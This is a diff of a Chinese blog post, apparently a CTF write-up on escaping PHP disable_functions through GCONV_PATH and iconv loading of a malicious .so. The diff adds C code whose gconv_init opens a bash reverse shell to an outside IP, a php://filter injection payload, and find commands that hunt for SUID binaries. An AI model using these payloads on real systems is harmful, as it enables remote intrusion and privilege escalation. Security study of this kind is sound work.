@@ -747,11 +747,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 1.1k |
+            <i class="fas fa-file-text-o"></i> 字数统计: 1.4k |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 4分钟 |
+            <i class="fas fa-clock"></i> 阅读时长: 5分钟 |
           </span>
   
           
@@ -832,12 +832,19 @@ module  INTERNAL    HACK&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;
 <p>再写hack.c文件，使用linux系统执行编译为.so文件：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-
 <span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
-
 <span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//反弹shell写法</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/175.178.47.228/8888 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>gcc hack.c -o hack.so -shared -fPIC</code>  </p>
 <p>生成的hack.so要上传到&#x2F;tmp目录下</p>
@@ -849,6 +856,21 @@ module  INTERNAL    HACK&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后访问&#x2F;shell.php触发函数调用即可看到flag文件在&#x2F;tmp文件夹下生成！</p>
+<h3 id="有关于php-x2F-x2F-filter的妙用"><a href="#有关于php-x2F-x2F-filter的妙用" class="headerlink" title="有关于php:&#x2F;&#x2F;filter的妙用"></a><strong>有关于php:&#x2F;&#x2F;filter的妙用</strong></h3><p>使用filter协议编码主动去调用.so文件，达到命令注入的目的</p>
+<p><code>a=putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#39;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#39;);</code></p>
+<h3 id="寻找拥有root权限的命令执行"><a href="#寻找拥有root权限的命令执行" class="headerlink" title="寻找拥有root权限的命令执行"></a>寻找拥有root权限的命令执行</h3><p><a target="_blank" rel="noopener" href="https://blog.gtwang.org/linux/unix-linux-find-command-examples/">有关find指令参数的学习</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.51gjie.com/linux/1015.html">ls -l指令详解</a></p>
+<pre class="line-numbers language-none"><code class="language-none">-user         &#x2F;&#x2F;根据属主来查找文件
+find . -type f &#x2F;&#x2F;将当前目录及其子目录中的所有文件列出
+
+&#x2F;dev&#x2F;null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃。因此，null这个设备通常也被称为位桶（bit bucket）或黑洞。
+所以，2&gt;&#x2F;dev&#x2F;null的意思就是将标准错误stderr删掉。
+
+find . -perm 664 便是在当前文件夹下查找 owner，group有读写权限，而其他用户只有读不能写的文件。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
 
       </div>
       <div class="post-tags-categories">
